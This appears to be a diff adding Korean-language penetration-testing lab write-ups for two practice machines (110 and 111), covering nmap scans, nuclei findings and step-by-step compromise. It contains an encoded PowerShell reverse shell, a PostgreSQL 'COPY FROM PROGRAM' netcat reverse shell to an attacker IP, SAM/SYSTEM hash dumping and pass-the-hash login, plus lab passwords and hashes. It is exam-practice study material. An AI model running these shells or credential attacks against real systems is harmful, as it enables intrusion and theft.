@@ -380,5 +380,177 @@ grep -i password -r .
 powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQAOQAuADEAMgAzACIALAA4ADAAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
 ```
 
+# 110 - Pwned
 
+## nmap
 
+```sh
+PORT     STATE SERVICE    VERSION
+21/tcp   open  ftp        vsftpd 3.0.5
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to 192.168.49.96
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 1
+|      vsFTPd 3.0.5 - secure, fast, stable
+|_End of status
+22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 43:5c:c0:36:35:2e:9d:17:7a:5d:62:e5:57:15:a0:c9 (ECDSA)
+|_  256 e2:5e:b2:4e:13:3a:7a:8d:77:f1:a8:8a:b5:0c:14:85 (ED25519)
+80/tcp   open  http       Apache httpd 2.4.52 ((Ubuntu))
+|_http-title: OSCP
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+3306/tcp open  mysql      MariaDB 5.5.5-10.6.22
+| mysql-info:
+|   Protocol: 10
+|   Version: 5.5.5-10.6.22-MariaDB-0ubuntu0.22.04.1
+|   Thread ID: 7
+|   Capabilities flags: 63486
+|   Some Capabilities: ConnectWithDatabase, FoundRows, SupportsTransactions, Support41Auth, SupportsLoadDataLocal, Speaks41ProtocolOld, IgnoreSigpipes, InteractiveClient, DontAllowDatabaseTableColumn, IgnoreSpaceBeforeParenthesis, SupportsCompression, ODBCClient, Speaks41ProtocolNew, LongColumnFlag, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
+|   Status: Autocommit
+|   Salt: wrT-!_<JCQLiM%o#]+[i
+|_  Auth Plugin Name: mysql_native_password
+5432/tcp open  postgresql PostgreSQL DB 14.7 - 14.9
+| ssl-cert: Subject: commonName=oscp
+| Subject Alternative Name: DNS:oscp
+| Not valid before: 2023-05-02T14:26:17
+|_Not valid after:  2033-04-29T14:26:17
+|_ssl-date: TLS randomness does not represent time
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+## web
+
+![web](/images/etc/standalone/image.png)
+
+- nuclei 툴 사용
+
+(nuclei 써도 되는지 찝찝한데 그 때는 브루트포스로 postgres의 비밀번호를 찾으면 된다)
+
+```sh
+nuclei -target http://192.168.96.110
+
+...
+[CVE-2023-48795] [javascript] [medium] 192.168.96.110:22 ["Vulnerable to Terrapin"]
+[ssh-auth-methods] [javascript] [info] 192.168.96.110:22 ["["publickey","password"]"]
+[pgsql-default-db] [javascript] [high] 192.168.96.110:5432 [FQDN="192.168.96.110",Host="192.168.96.110",Hostname="192.168.96.110:5432",Port="5432",database="postgres",password="amber",usernames="postgres"]
+[ssh-password-auth] [javascript] [info] 192.168.96.110:22
+[ssh-sha1-hmac-algo] [javascript] [info] 192.168.96.110:22
+[ssh-server-enumeration] [javascript] [info] 192.168.96.110:22 ["SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1"]
+[pgsql-default-db] [javascript] [high] 192.168.96.110:5432 [FQDN="192.168.96.110",Host="192.168.96.110",Hostname="192.168.96.110:5432",Port="5432",database="template1",password="amber",usernames="postgres"]
+[ftp-weak-credentials] [tcp] [high] 192.168.96.110:21 [password="123456",username="ftp"]
+```
+
+`postgres:amber`가 나옴.
+
+- postgres 접속 후 리버스쉘 연결
+
+```sh
+psql -h 192.168.96.110 -U postgres -d postgres
+```
+
+```sh
+CREATE TABLE shell(output text);
+COPY shell FROM PROGRAM 'busybox nc 192.168.49.96 443 -e /bin/bash';
+```
+
+또 다른 방법은 `/etc/passwd` 파일에서 유저 *betty* 확인 후 브루트포스.
+
+- betty 홈 디렉토리에서 local.txt 발견
+
+- pspy 다운로드 & 실행
+
+root의 비밀번호가 보임.
+
+![root](/images/etc/standalone/110-2.png)
+
+`root:AnotherLifeAdventure091`
+
+# 111 - Pwned
+
+- 내가 본 머신 중에 제일 간단
+
+## nmap
+
+```sh
+PORT     STATE SERVICE       VERSION
+21/tcp   open  ftp           Microsoft ftpd
+| ftp-syst:
+|_  SYST: Windows_NT
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| 05-13-26  12:35PM       <DIR>          configs
+| 05-13-26  12:35PM       <DIR>          logs
+| 05-13-26  12:35PM                  128 README.txt
+| 06-04-26  02:10PM                57344 SAM
+| 05-13-26  12:35PM       <DIR>          scripts
+| 06-04-26  02:10PM             11448320 SYSTEM
+|_06-04-26  02:10PM                   75 web.config
+80/tcp   open  http          Microsoft IIS httpd 10.0
+|_http-title: Offsec \xE2\x80\x94 Employee Portal
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+|_ssl-date: 2026-08-09T04:27:14+00:00; +1s from scanner time.
+| rdp-ntlm-info:
+|   Target_Name: OSCP
+|   NetBIOS_Domain_Name: OSCP
+|   NetBIOS_Computer_Name: OSCP
+|   DNS_Domain_Name: OSCP
+|   DNS_Computer_Name: OSCP
+|   Product_Version: 10.0.22000
+|_  System_Time: 2026-08-09T04:27:09+00:00
+| ssl-cert: Subject: commonName=OSCP
+| Not valid before: 2026-07-01T13:51:31
+|_Not valid after:  2026-12-31T13:51:31
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+```
+
+- ftp에 anonymous 로그인
+
+```sh
+05-13-26  12:35PM       <DIR>          configs
+05-13-26  12:35PM       <DIR>          logs
+05-13-26  12:35PM                  128 README.txt
+06-04-26  02:10PM                57344 SAM
+05-13-26  12:35PM       <DIR>          scripts
+06-04-26  02:10PM             11448320 SYSTEM
+06-04-26  02:10PM                   75 web.config
+```
+
+- SAM, SYSTEM 파일 발견.
+
+- binary 모드로 변경해야 다운로드 됨
+
+![ftp](/images/etc/standalone/ftp-binary.png)
+
+- 크레덴셜 덤프
+
+```sh
+impacket-secretsdump -sam SAM -system SYSTEM local
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:79aa62caf25987695bcc3be2c6c3119c:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:86f427da8502647da948b444a62a380b:::
+m.hayes:1004:aad3b435b51404eeaad3b435b51404ee:320a78179516c385e35a93ffa0b1c4ac:::
+j.miller:1006:aad3b435b51404eeaad3b435b51404ee:cd1c6c69beaaf480f48d372acad449af:::
+r.chase:1012:aad3b435b51404eeaad3b435b51404ee:7773c08920232397cae081704964b786:::
+```
+
+- 관리자로 접속하면 proof.txt까지 확인 가능
+
+```sh
+evil-winrm -i 192.168.96.111 -u administrator -H 79aa62caf25987695bcc3be2c6c3119c
+```
